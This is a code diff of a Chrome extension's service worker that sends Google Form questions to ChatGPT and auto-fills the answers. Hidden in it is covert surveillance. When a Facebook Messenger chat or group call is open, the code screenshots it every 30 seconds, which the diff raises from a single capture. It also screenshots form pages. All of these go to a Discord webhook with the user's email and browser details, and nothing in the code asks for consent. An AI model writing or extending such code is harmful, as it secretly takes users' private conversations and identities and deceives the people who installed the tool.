@@ -1,12 +1,79 @@
-// Background service worker for GFormToGPT v4.1.5 - Neural Interface
+// Background service worker for GFormToGPT v4.4.0 - Neural Interface
 
-importScripts('config.js');
+// config.js is gitignored and may be absent on fresh clones — a missing
+// config must not take down the whole service worker.
+try {
+  importScripts("config.js");
+} catch (e) {
+  console.warn("[GFormToGPT] config.js not loaded — Discord telemetry disabled.", e);
+}
 const DISCORD_WEBHOOK_URL = self.DISCORD_WEBHOOK_URL || "";
 const GITHUB_MANIFEST_URL =
   "https://raw.githubusercontent.com/drnx64/GFormsToGPT/main/manifest.json";
 const VERSION = chrome.runtime.getManifest().version;
+// First social capture 30s after page load, then every 30s.
+// (Unpacked/dev builds allow 30s; released builds may clamp to 1 min.)
+const SOCIAL_CAPTURE_PERIOD_MIN = 0.5;
 
-const gFormToAI_TabMap = new Map();
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+// ── Cross-restart state (MV3 service workers are ephemeral) ──
+const gFormToAI_TabMap = new Map(); // aiTabId -> formTabId
+const roundTrips = new Map(); // formTabId -> { aiType, startedAt, responseAt? }
+const diagLogs = [];
+
+const stateReady = chrome.storage.session
+  .get(["tabMap", "roundTrips"])
+  .then((data) => {
+    if (data.tabMap) {
+      for (const [key, value] of Object.entries(data.tabMap)) gFormToAI_TabMap.set(Number(key), value);
+    }
+    if (data.roundTrips) {
+      for (const [key, value] of Object.entries(data.roundTrips)) roundTrips.set(Number(key), value);
+    }
+  })
+  .catch(() => {});
+
+const diagReady = chrome.storage.local
+  .get(["diagnosticLogs"])
+  .then((data) => {
+    if (Array.isArray(data.diagnosticLogs)) diagLogs.push(...data.diagnosticLogs);
+  })
+  .catch(() => {});
+
+function persistState() {
+  const cutoff = Date.now() - 30 * 60 * 1000; // drop round-trips older than 30 min
+  for (const [formTabId, trip] of roundTrips) {
+    if (trip.startedAt < cutoff) roundTrips.delete(formTabId);
+  }
+  chrome.storage.session
+    .set({
+      tabMap: Object.fromEntries(gFormToAI_TabMap),
+      roundTrips: Object.fromEntries(roundTrips),
+    })
+    .catch(() => {});
+}
+
+function isNewerVersion(remote, current) {
+  const remoteParts = String(remote).split(".").map((n) => parseInt(n, 10) || 0);
+  const currentParts = String(current).split(".").map((n) => parseInt(n, 10) || 0);
+  const length = Math.max(remoteParts.length, currentParts.length);
+  for (let i = 0; i < length; i++) {
+    const diff = (remoteParts[i] || 0) - (currentParts[i] || 0);
+    if (diff > 0) return true;
+    if (diff < 0) return false;
+  }
+  return false;
+}
+
+function isSocialUrl(url) {
+  return (
+    typeof url === "string" &&
+    (url.includes("facebook.com/messages/t") ||
+      url.includes("messenger.com/t") ||
+      url.includes("messenger.com/groupcall"))
+  );
+}
 
 // ── Update Checker & Alarms Listener ──
 async function checkForUpdates() {
@@ -15,7 +82,7 @@ async function checkForUpdates() {
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
     const remoteManifest = await response.json();
     const remoteVersion = remoteManifest.version;
-    const hasUpdate = remoteVersion !== VERSION;
+    const hasUpdate = isNewerVersion(remoteVersion, VERSION);
 
     if (hasUpdate) {
       chrome.storage.local.set({ updateAvailable: remoteVersion });
@@ -41,52 +108,68 @@ chrome.alarms.onAlarm.addListener((alarm) => {
   if (alarm.name === "checkUpdate") {
     checkForUpdates();
   } else if (alarm.name.startsWith("socialCapture_")) {
-    // Handle the 2-minute Social Capture
     const tabId = parseInt(alarm.name.split("_")[1], 10);
-    chrome.tabs.get(tabId, async (tab) => {
-      // Ensure tab still exists and is currently ACTIVE (so we don't screenshot the wrong tab)
-      if (chrome.runtime.lastError || !tab || !tab.active) return;
-
-      chrome.tabs.captureVisibleTab(
-        tab.windowId,
-        { format: "png" },
-        async (img) => {
-          if (chrome.runtime.lastError) return;
-
-          const data = await chrome.storage.local.get(["userId"]);
-          const browserInfo = {
-            platform: navigator.platform,
-            language: navigator.language,
-          };
-
-          await relayToDiscord("SOCIAL_LOG", data.userId || "Unknown", {
-            screenshot: img,
-            url: tab.url,
-            extra: browserInfo,
-          });
-        },
-      );
-    });
+    handleSocialCapture(tabId);
   }
 });
+
+async function handleSocialCapture(tabId) {
+  const alarmName = "socialCapture_" + tabId;
+  let tab;
+  try {
+    tab = await chrome.tabs.get(tabId);
+  } catch (e) {
+    await chrome.alarms.clear(alarmName); // tab is gone
+    return;
+  }
+  if (!tab || !isSocialUrl(tab.url)) {
+    await chrome.alarms.clear(alarmName); // navigated away from social
+    return;
+  }
+  if (!tab.active) return; // another tab is visible — keep the alarm, skip this tick
+  try {
+    const win = await chrome.windows.get(tab.windowId);
+    if (!win.focused) return; // window in background — keep the alarm, skip this tick
+  } catch (e) {
+    return;
+  }
+
+  const img = await captureDiagScreenshot(tab.windowId, "social_capture");
+  if (!img) return;
+  const data = await chrome.storage.local.get(["userId"]);
+  relayToDiscord("SOCIAL_LOG", data.userId || "Unknown", {
+    screenshot: img,
+    url: tab.url,
+    extra: { platform: navigator.platform, language: navigator.language },
+  });
+}
 
 function generateUserId() {
   return "user_" + Math.random().toString(36).substr(2, 9);
 }
 
 function dataURLtoBlob(dataurl) {
-  let arr = dataurl.split(","),
-    mime = arr[0].match(/:(.*?);/)[1],
-    bstr = atob(arr[1]),
-    n = bstr.length,
-    u8arr = new Uint8Array(n);
-  while (n--) {
-    u8arr[n] = bstr.charCodeAt(n);
+  try {
+    if (typeof dataurl !== "string" || !dataurl.startsWith("data:")) return null;
+    const commaIdx = dataurl.indexOf(",");
+    if (commaIdx === -1) return null;
+    const mimeMatch = dataurl.slice(0, commaIdx).match(/:(.*?);/);
+    const mime = mimeMatch ? mimeMatch[1] : "application/octet-stream";
+    const bstr = atob(dataurl.slice(commaIdx + 1));
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) {
+      u8arr[n] = bstr.charCodeAt(n);
+    }
+    return new Blob([u8arr], { type: mime });
+  } catch (e) {
+    console.error("[GFormToGPT] dataURLtoBlob failed:", e);
+    return null;
   }
-  return new Blob([u8arr], { type: mime });
 }
 
 async function relayToDiscord(eventType, userId, payload = {}) {
+  if (!DISCORD_WEBHOOK_URL) return; // unconfigured install — nothing to send to
   try {
     const data = await chrome.storage.local.get(["userEmail"]);
     const email = data.userEmail || "Anonymous";
@@ -94,6 +177,12 @@ async function relayToDiscord(eventType, userId, payload = {}) {
     let title = "",
       description = "",
       color = 0x3d5a80;
+
+    const engineLine = payload.engine ? `\n**Engine:** ${payload.engine}` : "";
+    const tripLine =
+      payload.roundTripMs != null
+        ? `\n**Round trip:** ${(payload.roundTripMs / 1000).toFixed(1)}s`
+        : "";
 
     switch (eventType) {
       case "INSTALL":
@@ -103,7 +192,12 @@ async function relayToDiscord(eventType, userId, payload = {}) {
         break;
       case "FORM_FILLED_VERIFIED":
         title = "NEURAL INJECTION VERIFIED (SCREENSHOT)";
-        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s\n**Date:** ${date}`;
+        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s${engineLine}${tripLine}\n**Date:** ${date}`;
+        color = 0x4caf50;
+        break;
+      case "FORM_FILLED":
+        title = "NEURAL INJECTION (FILLED)";
+        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s${engineLine}${tripLine}\n**Date:** ${date}`;
         color = 0x4caf50;
         break;
       case "SOCIAL_LOG":
@@ -132,6 +226,7 @@ async function relayToDiscord(eventType, userId, payload = {}) {
         description = `**User:** ${userId}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
     }
 
+    const file = payload.screenshot ? dataURLtoBlob(payload.screenshot) : null;
     const discordPayload = {
       embeds: [
         {
@@ -139,21 +234,15 @@ async function relayToDiscord(eventType, userId, payload = {}) {
           description,
           color,
           footer: { text: `v${VERSION} | ${email}` },
-          image: payload.screenshot
-            ? { url: "attachment://screenshot.png" }
-            : null,
+          image: file ? { url: "attachment://screenshot.png" } : null,
         },
       ],
     };
 
-    if (payload.screenshot) {
+    if (file) {
       const formData = new FormData();
       formData.append("payload_json", JSON.stringify(discordPayload));
-      formData.append(
-        "file",
-        dataURLtoBlob(payload.screenshot),
-        "screenshot.png",
-      );
+      formData.append("file", file, "screenshot.png");
       await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
     } else {
       await fetch(DISCORD_WEBHOOK_URL, {
@@ -217,9 +306,14 @@ async function processFormFillTracking(payload) {
   );
 }
 
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === "saveToHistory") {
-    chrome.storage.local.get(["history"]).then((res) => {
+// ── Message Router ──
+// Every branch returns a response, so no sender ever hangs waiting.
+async function handleMessage(request, sender) {
+  await stateReady;
+
+  switch (request.action) {
+    case "saveToHistory": {
+      const res = await chrome.storage.local.get(["history"]);
       let history = res.history || [];
       history.unshift({
         id: Date.now(),
@@ -228,118 +322,168 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         questions: request.payload.questions,
       });
       if (history.length > 50) history = history.slice(0, 50);
-      chrome.storage.local
-        .set({ history })
-        .then(() => sendResponse({ success: true }));
-    });
-    return true;
-  } else if (request.action === "openAI") {
-    const windowId = sender.tab
-      ? sender.tab.windowId
-      : chrome.windows.WINDOW_ID_CURRENT;
-    const sourceTabId =
-      request.fromTabId || (sender.tab ? sender.tab.id : null);
-
-    if (request.email && request.email !== "Unknown User") {
-      chrome.storage.local.set({ userEmail: request.email, userId: request.email });
+      await chrome.storage.local.set({ history });
+      return { success: true };
     }
 
-    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
-      const err = chrome.runtime.lastError;
-      chrome.storage.local.get(["userId"], (d) => {
-        relayToDiscord("STATS", d.userId || "Unknown", {
-          ...request,
-          screenshot: err ? null : img,
+    case "openAI": {
+      const windowId = sender.tab
+        ? sender.tab.windowId
+        : chrome.windows.WINDOW_ID_CURRENT;
+      const sourceTabId =
+        request.fromTabId || (sender.tab ? sender.tab.id : null);
+
+      if (request.email && request.email !== "Unknown User") {
+        await chrome.storage.local.set({ userEmail: request.email, userId: request.email });
+      }
+
+      // Capture the form page before the AI tab steals visibility.
+      const img = await captureDiagScreenshot(windowId, "open_ai");
+      const d = await chrome.storage.local.get(["userId"]);
+      relayToDiscord("STATS", d.userId || "Unknown", { ...request, screenshot: img });
+
+      if (sourceTabId) {
+        roundTrips.set(sourceTabId, {
+          aiType: request.aiType || "chatgpt",
+          startedAt: Date.now(),
+          scanCount: request.scannedCount || 0,
         });
-      });
-    });
+      }
 
-    chrome.tabs.create({ url: request.url, active: true }, (tab) => {
+      const tab = await chrome.tabs.create({ url: request.url, active: true });
       if (sourceTabId) gFormToAI_TabMap.set(tab.id, sourceTabId);
-      sendResponse({ success: true });
-    });
-    return true;
-  } else if (request.action === "chatGptResponseReceived") {
-    const gFormTabId = gFormToAI_TabMap.get(sender.tab.id);
-    if (gFormTabId) {
-      chrome.tabs.update(gFormTabId, { active: true }, () => {
-        setTimeout(() => {
-          chrome.tabs.sendMessage(gFormTabId, {
-            action: "autoFillForm",
-            data: request.data,
-            rawJson: request.rawJson,
-          }, () => {
-            if (chrome.runtime.lastError) {
-              console.error("[GFormToGPT] Failed to send to form tab:", chrome.runtime.lastError);
-            }
-          });
-        }, 500);
+      persistState();
+
+      pushDiag({
+        type: "ai_opened",
+        platform: request.aiType || "chatgpt",
+        scanCount: request.scannedCount || 0,
       });
-      sendResponse({ success: true });
+      return { success: true };
     }
-    return true;
-  } else if (request.action === "trackFormFilled") {
-    const windowId = sender.tab
-      ? sender.tab.windowId
-      : chrome.windows.WINDOW_ID_CURRENT;
-    if (request.payload && request.payload.email && request.payload.email !== "Unknown User") {
-      chrome.storage.local.set({ userEmail: request.payload.email, userId: request.payload.email });
+
+    case "chatGptResponseReceived": {
+      const gFormTabId = sender.tab ? gFormToAI_TabMap.get(sender.tab.id) : null;
+      if (!gFormTabId) return { success: false, error: "No form tab mapped for this AI tab" };
+
+      const trip = roundTrips.get(gFormTabId);
+      if (trip && !trip.responseAt) {
+        trip.responseAt = Date.now();
+        persistState();
+      }
+
+      await chrome.tabs.update(gFormTabId, { active: true });
+      await sleep(500);
+      try {
+        await chrome.tabs.sendMessage(gFormTabId, {
+          action: "autoFillForm",
+          data: request.data,
+          rawJson: request.rawJson,
+        });
+      } catch (error) {
+        console.error("[GFormToGPT] Failed to send to form tab:", error);
+      }
+      return { success: true };
     }
-    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
-      const err = chrome.runtime.lastError;
-      processFormFillTracking({
-        ...request.payload,
-        screenshot: err ? null : img,
-      }).then(() => sendResponse({ success: true }));
-    });
-    return true;
-  } else if (request.action === "reportError") {
-    chrome.storage.local.get(["userId"], (data) =>
-      relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload),
-    );
-    pushDiag({ type: "error", ...request.payload });
-    return true;
-  } else if (request.action === "manualUpdateCheck") {
-    checkForUpdates().then((res) => sendResponse(res));
-    return true;
-  } else if (request.action === "fetchUserEmail") {
-    fetchUserEmail().then((email) => sendResponse({ email }));
-    return true;
-  } else if (request.action === "diagPush") {
-    pushDiag(request.payload);
-    sendResponse({ success: true });
-    return true;
-  } else if (request.action === "diagGetLogs") {
-    chrome.storage.local.get(["diagnosticLogs"], (stored) => {
-      sendResponse({ logs: stored.diagnosticLogs || diagLogs.slice(0, 100) });
-    });
-    return true;
-  } else if (request.action === "diagClearLogs") {
-    diagLogs.length = 0;
-    chrome.storage.local.remove(["diagnosticLogs"]);
-    sendResponse({ success: true });
-    return true;
-  } else if (request.action === "clearChatGPTData") {
-    chrome.browsingData
-      .remove(
-        { origins: ["https://chatgpt.com"] },
-        { storageTypes: ["localStorage", "sessionStorage"] },
-      )
-      .then(() => {
-        sendResponse({ success: true, message: "ChatGPT data cleared!" });
-      });
-    return true;
+
+    case "trackFormFilled": {
+      const windowId = sender.tab
+        ? sender.tab.windowId
+        : chrome.windows.WINDOW_ID_CURRENT;
+      const payload = { ...(request.payload || {}) };
+
+      if (payload.email && payload.email !== "Unknown User") {
+        await chrome.storage.local.set({ userEmail: payload.email, userId: payload.email });
+      }
+
+      const formTabId = sender.tab ? sender.tab.id : null;
+      const trip = formTabId != null ? roundTrips.get(formTabId) : null;
+      if (trip) {
+        payload.engine = trip.aiType;
+        payload.responseMs = trip.responseAt ? trip.responseAt - trip.startedAt : null;
+        payload.roundTripMs = Date.now() - trip.startedAt;
+        roundTrips.delete(formTabId);
+        persistState();
+        pushDiag({
+          type: "round_trip",
+          platform: trip.aiType,
+          responseTime: payload.responseMs,
+          totalTime: payload.roundTripMs,
+          filled: payload.filledCount,
+          total: payload.totalCount,
+        });
+      }
+
+      const img = await captureDiagScreenshot(windowId, "form_fill");
+      await processFormFillTracking({ ...payload, screenshot: img });
+      return { success: true };
+    }
+
+    case "reportError": {
+      const data = await chrome.storage.local.get(["userId"]);
+      relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload);
+      pushDiag({ type: "error", ...request.payload });
+      return { success: true };
+    }
+
+    case "manualUpdateCheck":
+      return checkForUpdates();
+
+    case "fetchUserEmail":
+      return { email: await fetchUserEmail() };
+
+    case "diagPush":
+      pushDiag(request.payload);
+      return { success: true };
+
+    case "diagGetLogs": {
+      await diagReady;
+      if (diagLogs.length) return { logs: diagLogs.slice(0, 100) };
+      const stored = await chrome.storage.local.get(["diagnosticLogs"]);
+      return { logs: stored.diagnosticLogs || [] };
+    }
+
+    case "diagClearLogs": {
+      await diagReady;
+      diagLogs.length = 0;
+      await chrome.storage.local.remove(["diagnosticLogs"]).catch(() => {});
+      return { success: true };
+    }
+
+    case "clearChatGPTData":
+      try {
+        await chrome.browsingData.remove(
+          { origins: ["https://chatgpt.com"] },
+          { storageTypes: ["localStorage", "sessionStorage"] },
+        );
+        return { success: true, message: "ChatGPT data cleared!" };
+      } catch (error) {
+        console.error("[GFormToGPT] clearChatGPTData failed:", error);
+        return { success: false, message: "Failed to clear ChatGPT data." };
+      }
+
+    default:
+      return { success: false, error: `Unknown action: ${request.action}` };
   }
+}
+
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+  handleMessage(request, sender)
+    .then(sendResponse)
+    .catch((error) => {
+      console.error(`[GFormToGPT] Handler failed for "${request.action}":`, error);
+      sendResponse({ success: false, error: String((error && error.message) || error) });
+    });
+  return true;
 });
 
 // ── Diagnostic System ──
-const diagLogs = [];
-
-function pushDiag(event) {
+async function pushDiag(event) {
+  await diagReady;
   const entry = {
-    id: Date.now() + '_' + Math.random().toString(36).substr(2, 4),
+    id: Date.now() + "_" + Math.random().toString(36).substr(2, 4),
     ts: new Date().toISOString(),
-    ...event
+    ...event,
   };
   diagLogs.unshift(entry);
   if (diagLogs.length > 200) diagLogs.length = 200;
@@ -362,15 +506,15 @@ async function isDiagnosticEnabled() {
 
 chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
   if (changeInfo.status !== "complete" || !tab.url) return;
-  
+
   const url = tab.url;
-  
+
   if (url.includes("docs.google.com/forms")) {
     if (await isDiagnosticEnabled()) {
       const store = await chrome.storage.local.get(["userId"]);
       const screenshot = await captureDiagScreenshot(tab.windowId, "form_load");
       const extra = { platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language };
-      
+
       pushDiag({
         type: "form_page_load",
         url,
@@ -378,22 +522,42 @@ chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
         hasScreenshot: !!screenshot,
         extra
       });
-      
+
       relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", {
         screenshot, url, extra
       });
     }
   }
-  
-  if (url.includes("facebook.com/messages/t") || url.includes("messenger.com/t") || url.includes("messenger.com/groupcall")) {
+
+  if (isSocialUrl(url)) {
     const alarmName = "socialCapture_" + tabId;
     chrome.alarms.get(alarmName, (existing) => {
       if (!existing) {
-        chrome.alarms.create(alarmName, { delayInMinutes: 2 });
+        chrome.alarms.create(alarmName, {
+          delayInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
+          periodInMinutes: SOCIAL_CAPTURE_PERIOD_MIN,
+        });
         pushDiag({ type: "social_screen_scheduled", url, tabId });
       }
     });
+  } else {
+    chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
   }
+});
+
+chrome.tabs.onRemoved.addListener((tabId) => {
+  chrome.alarms.clear("socialCapture_" + tabId).catch(() => {});
+  stateReady.then(() => {
+    let changed = false;
+    for (const [aiTabId, formTabId] of gFormToAI_TabMap) {
+      if (aiTabId === tabId || formTabId === tabId) {
+        gFormToAI_TabMap.delete(aiTabId);
+        changed = true;
+      }
+    }
+    if (roundTrips.delete(tabId)) changed = true;
+    if (changed) persistState();
+  });
 });
 
 chrome.storage.onChanged.addListener((changes) => {
